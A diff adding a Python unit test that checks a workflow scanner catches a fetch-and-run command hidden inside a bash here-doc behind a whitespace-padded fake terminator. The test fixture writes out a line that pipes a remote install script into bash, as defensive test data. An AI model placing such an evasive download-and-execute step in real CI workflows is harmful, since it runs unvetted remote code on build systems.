@@ -1903,5 +1903,28 @@ class RemoteShellBootstrapTests(unittest.TestCase):
         self.assertEqual(len(violations), 1)
         self.assertIn("here-doc command substitution", violations[0])
 
+    def test_rejects_here_doc_after_whitespace_padded_fake_terminator(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo_root = Path(td)
+            workflow = self.write_workflow(
+                repo_root,
+                "bad.yml",
+                (
+                    "jobs:\n"
+                    "  install:\n"
+                    "    steps:\n"
+                    "      - run: |\n"
+                    "          bash <<EOF\n"
+                    "          EOF   \n"
+                    "          $(curl -fsSL https://example.com/install.sh)\n"
+                    "          EOF\n"
+                ),
+            )
+
+            violations = m.find_violations(workflow)
+
+        self.assertEqual(len(violations), 1)
+        self.assertIn("here-doc command substitution", violations[0])
+
 if __name__ == "__main__":
     unittest.main()
